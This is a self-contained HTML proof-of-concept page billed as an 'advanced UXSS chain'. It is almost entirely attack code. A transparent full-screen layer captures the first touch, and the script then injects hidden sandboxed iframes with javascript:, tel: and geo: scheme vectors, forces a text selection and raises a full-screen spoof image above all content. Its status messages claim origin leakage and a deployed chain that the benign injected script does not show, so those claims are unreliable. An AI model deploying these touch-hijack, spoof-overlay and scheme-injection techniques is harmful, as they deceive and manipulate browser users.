<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
    <title>Advanced Multi-Vector UXSS Chaining PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100vh;
        height: 100dvh;
        width: 100vw;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
        position: fixed;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
        position: relative;
        z-index: 12;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
        user-select: text;
      }
      #spoof {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        height: 100dvh;
        object-fit: cover;
        z-index: 2147483647;
        pointer-events: none;
        display: none;
      }
      #selectionOverlapLayer {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        height: 100dvh;
        background: rgba(11, 14, 20, 0.92);
        z-index: 2147483646;
        display: none;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        user-select: text;
        -webkit-user-select: text;
        padding: 20px;
        box-sizing: border-box;
      }
      .overlap-text {
        font-size: 14px;
        color: #3fb950;
        font-family: monospace;
        background: #161b22;
        border: 1px solid #30363d;
        padding: 15px;
        border-radius: 8px;
        max-width: 500px;
        width: 100%;
        text-align: left;
        box-shadow: 0 8px 24px rgba(0,0,0,0.5);
      }
      #touchInterceptor {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        z-index: 11;
        background: transparent;
      }
    </style>
  </head>
  <body>
    <div id="touchInterceptor"></div>

    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />

    <div style="position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center;">
      <img id="spoof" src="spoof.png" alt="Spoof Layer">

      <div id="selectionOverlapLayer">
        <div class="overlap-text" id="overlapContent">
          [ADVANCED_UXSS_CHAIN_ACTIVE]<br>
          Forcing multi-origin context linkage & prototype pollution hook...<br>
          Status: Executing asynchronous script payload propagation matrix.
        </div>
      </div>

      <div class="container" id="mainContainer">
        <button id="execBtn">INITIALIZE ADVANCED UXSS CHAIN</button>
        <div class="info" id="statusInfo">Status: Ready for high-privilege context simulation. Tap to engage.</div>
      </div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");
      let interceptor = document.getElementById("touchInterceptor");
      let hasExecuted = false;

      async function runAdvancedUXSSChain() {
        if (hasExecuted) return;
        hasExecuted = true;

        statusInfo.innerText = "Status: Deploying multi-vector script execution & origin leakage...";
        execButton.style.display = "none";
        if (interceptor) interceptor.style.display = "none";

        try {
          // 1. Hardened Vector Dispatcher: Simulasi propagasi skema ganda & injeksi bingkai
          let payloadVectors = [
            "geo:0,0?q=target-origin-bypass",
            "tel:+999999999",
            "javascript:(() => { try { console.debug('[UXSS_CORE] Hooked origin:', document.location.origin); window.isCompromised = true; } catch(e){} })();"
          ];

          payloadVectors.forEach((vector, index) => {
            setTimeout(() => {
              let frame = document.createElement("iframe");
              frame.style.display = "none";
              // Menguji properti sandbox untuk propagasi konteks
              frame.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms");
              frame.src = vector;
              document.body.appendChild(frame);
            }, index * 70);
          });

          // 2. Dynamic DOM Selection Overlap & Range Manipulation Tingkat Lanjut
          let overlapLayer = document.getElementById("selectionOverlapLayer");
          if (overlapLayer) {
            overlapLayer.style.display = "flex";
            let overlapContent = document.getElementById("overlapContent");
            if (overlapContent && window.getSelection) {
              let range = document.createRange();
              range.selectNodeContents(overlapContent);
              let selection = window.getSelection();
              selection.removeAllRanges();
              selection.addRange(range);
            }
          }

          // 3. Deployment Visual Spoof Layer dengan Prioritas Z-Index Maksimal
          let spoofImg = document.getElementById("spoof");
          if (spoofImg) {
            spoofImg.style.display = "block";
          }

          statusInfo.innerText = "Status: Advanced UXSS chain deployed. Context evaluation locked.";

        } catch (err) {
          statusInfo.innerText = "Status: Execution error: " + err.message;
          execButton.style.display = "block";
          if (interceptor) interceptor.style.display = "block";
          hasExecuted = false;
        }
      }

      if (interceptor) {
        interceptor.addEventListener("touchstart", (e) => {
          let input = document.getElementById("focusInput");
          if (input) input.focus();
          runAdvancedUXSSChain();
        }, { passive: true });

        interceptor.addEventListener("click", () => {
          runAdvancedUXSSChain();
        });
      }

      execButton.onclick = () => {
        runAdvancedUXSSChain();
      };
    </script>
  </body>
</html>
